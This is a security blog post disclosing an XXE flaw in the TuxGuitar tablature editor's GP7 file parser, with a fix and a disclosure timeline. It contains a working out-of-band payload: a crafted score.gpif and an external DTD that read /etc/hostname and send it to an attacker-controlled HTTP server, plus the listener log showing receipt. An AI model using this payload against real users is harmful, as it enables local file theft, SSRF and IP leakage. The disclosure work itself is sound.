=== Content from logicaltrust.net_9cc81e97_20250119_115214.html ===

Menu

[![](/images/logo.svg)](/en/)

* [Home](/en/)
* [Services](/en/#services)
* [Blog](/blog.html)
* [About us](/about.html)
* [Contact](#contact)

* [**EN**](/en/)
* [PL](/)

# [EN] A-Z: TuxGuitar - stealing local files (XXE)

[TuxGuitar](https://en.wikipedia.org/wiki/TuxGuitar) is an open-source tablature player and editor, that supports many different file formats, including proprietary Guitar Pro’s formats. As I play the guitar from time to time and use TuxGuitar for practice and learning songs I couldn’t resist peeking into it. By looking at the source code I noticed usages of XML parsers without anti-XXE configuration. I decided to dig into it to find out whether it is exploitable.

[![start](/images/tux1-50.png)](https://sourceforge.net/projects/tuxguitar/)

```
private Document getDocument(InputStream stream) {
    try {
      return DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(stream);
    } catch (Throwable throwable) {
```

One of the occurrences led me to the `GPXDocumentReader` class. A quick look through revealed that this class is responsible for parsing `GP6` and `GP7` (also called `GP`) - the two newest Guitar Pro’s formats. Both of them are archives containing XML documents but compressed using different algorithms. `GP6` is based on `BCFZ` which was unfamiliar for me and `GP7` is just a `zip`, so my choice for further analysis was obvious. At that moment I wanted to learn how `GP7` structure looks like. Instead of reading the code and re-creating the archive, I wanted to just find any already existing file and decompress it. Unfortunately, TuxGuitar doesn’t support exporting to this format, also as this format is quite new, it was hard to find any occurrence on the Internet (all tablatures I found were saved in older formats). So I used a trial of Guitar Pro to create very simple tablature and save it in the desired format. Finally, I was able to unzip it and look at its contents:

```
$ unzip -l poc1.gp
Archive:  poc1.gp
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  05-15-2020 17:29   Content/
       12  05-14-2020 17:49   Content/LayoutConfiguration
      192  05-14-2020 17:49   Content/Preferences.json
    14412  05-15-2020 17:29   Content/score.gpif
       20  05-14-2020 17:49   Content/PartConfiguration
    19702  05-14-2020 17:49   Content/BinaryStylesheet
        3  05-14-2020 17:49   VERSION
---------                     -------
    34341                     7 files
```

`GPXFileSystem` and `GPXInputStream` classes gave me information that `Content/score.gpif` is an XML file I may want to alter.

```
public class GPXInputStream implements TGSongReader {

  public static final TGFileFormat FILE_FORMAT = new TGFileFormat("Guitar Pro 7", "audio/x-gtp", new String[]{"gp"});

  public TGFileFormat getFileFormat() {
    return FILE_FORMAT;
  }

  public void read(TGSongReaderHandle handle) throws TGFileFormatException {
    try {
 [...]
      GPXDocumentReader gpxReader = new GPXDocumentReader(gpxFileSystem.getFileContentsAsStream(GPXFileSystem.RESOURCE_SCORE), GPXDocumentReader.GP7);
```

```
public class GPXFileSystem {

  public static final String RESOURCE_SCORE = "Content/score.gpif";
[...]
```

I opened the file, put an OOB stealing file payload (lines 2-6 and 8 are added by me) and saved the changes.

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE oob [
        <!ENTITY % sy SYSTEM "http://192.168.0.102:8000/ev1.dtd">
        %sy;
        %param1;
        ]>
<GPIF>
<xxe>&exfil;</xxe>
<GPVersion>7</GPVersion>
<GPRevision required="12021" recommended="12023">12025</GPRevision>
<Encoding>
<EncodingDescription>GP7</EncodingDescription>
</Encoding>
<Score>
<Title><![CDATA[]]></Title>
<SubTitle><![CDATA[]]></SubTitle>
<Artist><![CDATA[]]></Artist>
<Album><![CDATA[]]></Album>
<Words><![CDATA[]]></Words>
<Music><![CDATA[]]></Music>
<WordsAndMusic><![CDATA[]]></WordsAndMusic>
<Copyright><![CDATA[]]></Copyright>
<Tabber><![CDATA[]]></Tabber>
<Instructions><![CDATA[]]></Instructions>
<Notices><![CDATA[]]></Notices>
<FirstPageHeader>[...]</PageFooter>
<ScoreSystemsDefaultLayout>4</ScoreSystemsDefaultLayout>
<ScoreSystemsLayout>4</ScoreSystemsLayout>
<ScoreZoomPolicy>Value</ScoreZoomPolicy>
<ScoreZoom>1</ScoreZoom>
<MultiVoice>0></MultiVoice>
</Score>
<MasterTrack>
<Tracks>0</Tracks>
[...]
```

On my second machine I prepared the second part of the payload - `ev1.dtd` stealing content of `/etc/hostname`

```
<!ENTITY % hostname SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.0.102:8000/?h=%hostname;'>">
```

and served it using python’s embedded HTTP server.

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Finally, I loaded the tablature
[![start](/images/tux2-50.png)](/images/tux2.png)
and received the stolen file:

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.0.105 - - [14/May/2020 19:46:10] "GET /ev1.dtd HTTP/1.1" 200 -
192.168.0.105 - - [14/May/2020 19:46:10] "GET /?h=m-LIFEBOOK-A555-G HTTP/1.1" 200 -
```

There are two drawbacks that impede exploitation:

1. After opening a malicious file, the application starts reporting a lot of parsing related errors. It makes the whole attack noisy and users definitely will see that something is wrong.
   [![start](/images/tux3.png)](/images/tux3.png)
2. Because of how Java creates URLs it’s impossible to steal files containing newline characters.

Nonetheless, this vulnerability can be exploited to steal some local files, perform SSRF attacks against users’ internal services, or to leak users’ IP addresses. For many users, the whole idea of using this application is to use tablatures prepared by others and downloaded from the Internet, so it is not unlikely to encounter a malicious one.

## Fix

According to [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), this problem can be solved by proper configuration of a parser.

```
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
String FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
dbf.setFeature(FEATURE, true);
```
## Submission

This vulnerability was initially reported on the project’s private issue tracker on 15.05.2020. Then resubmitted publicly:

* <https://sourceforge.net/p/tuxguitar/bugs/126/>

Written on June 15, 2020 by
Michał Dardas

## We invite you to contact us

through the following form:

**I agree to the processing of my personal data and sending the offer.**
Rules for the processing of personal data.

send

LogicalTrust sp. z o.o.
sp. k.

Stanisławowska 47
54-611 Wrocław, Poland, EU

NIP: 8952177980
KRS: 0000713515

**T.: +48 797 772 743**

**office@logicaltrust.net**
Key:   [PGP/GPG](/logicaltrust.gpg)

![LogicalTrust](/images/logo.svg)

copyright © 2007 - 2024 LogicalTrust

We support:
![las na zawsze - logo](/images/foundationlogo-lasnazawsze_a.png)
![unicef - logo](/images/foundationlogo-unicef_a.png)

×
## Rules for the processing of personal data.

According to art. 13 of the General Regulation on the Protection of Personal Data of 27 April 2016 (Official Journal EU L 119 of 04.05.2016) I inform that:

* **Data Administrator:** The administrator of your personal data is Logicaltrust sp. z o.o. sp. k., with its registered office at ul. Stanisławowska 47, 54-611 Wrocław, Tax Identification Number (NIP): 8952177980, National Business Registry Number (REGON): 369271084, National Court Register Number (KRS): 0000713515.
* **Contact with the Data Administrator:** You can contact the data administrator via email at: ado@logicaltrust.net or by traditional mail by sending a letter to the administrator's registered office address.
* **Purpose and Legal Basis for Processing Personal Data:** Your personal data will be processed by the data administrator for the purpose of responding to your inquiries, executing requested contact, taking actions prior to entering into a contract, performing the contract, establishing business relationships, presenting offers upon potential client's request (based on Art. 6(1)(a), (b), and (f) of the General Data Protection Regulation).
* **Data Processing Period:** Your personal data will be processed for the time necessary to clarify your matter and provide a comprehensive response. They will also be processed for the duration of cooperation and the contract (in this case, the data is processed as client data). In the event of non-cooperation, the data will be promptly deleted unless there is a need for further retention for the purpose of defense and protection against claims. In cases where the processing of personal data is based on voluntarily given consent according to Art. 6(1)(a) of the General Data Protection Regulation, you have the right to withdraw your consent at any time. The withdrawal of consent does not affect the lawfulness of processing based on consent before its withdrawal, in accordance with the applicable law.
* **Scope of Processed Data:** The scope of processed data includes: first name, last name, email, and phone number.
* **Recipients of Personal Data:** In specific situations, your personal data may be disclosed, for example, to fulfill a legal obligation or to exercise legally justified interests pursued by the data administrator or by a third party. The categories of recipients to whom the data administrator may disclose your personal data are entities or authorities authorized by law and service providers processing personal data on behalf of the data administrator based on data processing agreements (e.g., hosting company).
* **Data Transfers:** Your personal data will not be transferred outside the European Economic Area.
* **Rights and Entitlements:** You have the right to request access to your personal data, their correction, deletion, or processing limitations, as well as the right to object to data processing. You also have the right to file a complaint with the President of the Personal Data Protection Office (ul. Stawki 2, 00-193 Warsaw) if you believe that the processing of personal data violates data protection regulations.
* **Additional Information:** Providing data is voluntary, but failure to provide data necessary for correspondence may hinder the execution and maintenance of contact.

×
## Cookie policy

* 1. **About cookies** - Cookies are small data files, especially text files, which are stored by a server on your computer. With these files, your device will be recognized and, in consequence, the way a given website is presented will be adjusted to your personal preferences. Cookies usually contain the name of the website from which they originate, information on how long they have been stored on the device and a unique number.
* 2. **Which type of cookies do we use** - Session cookies – temporary files which are stored on your device until you log out from a given website or close the Internet browser. Persistent cookies – permanent files that remain on your device for a fixed period (specified in the parameters of the file) or until they are deleted manually. Third-party cookies – files that adjust the way a given website is presented to your personal preferences.
* 3. **Why do we use cookies?** - Cookies are used for the purpose of statistics, marketing and in order to adjust the contents of websites to the user's personal preferences. Cookies store information about geolocation, the visitor's language and random data about session identifiers. With the collected data, we are able to understand how exactly the visitor uses websites and, consequently, to improve their structure and content. The information received helps us to prepare statistics related to the number of new and regular users as well as enables us to analyze which pages are visited.
* 4. **How to use and how to disable cookies** - You can change the settings of your Internet browser at any time, so that it would block cookies or inform you when they are being sent. However, please note that if you do not accept the cookie policy, you may encounter some problems while using the website. The software used for searching websites accepts the cookies by default. The settings of an Internet browser can be changed, so that it would block cookies or inform the user each time when cookies are being sent onto his/her device. For more information on how to disable automatic saving of cookies, please check the settings of your Internet browser (the software used for searching Internet websites).

This page uses cookies. Click here to learn more. Accept Reject


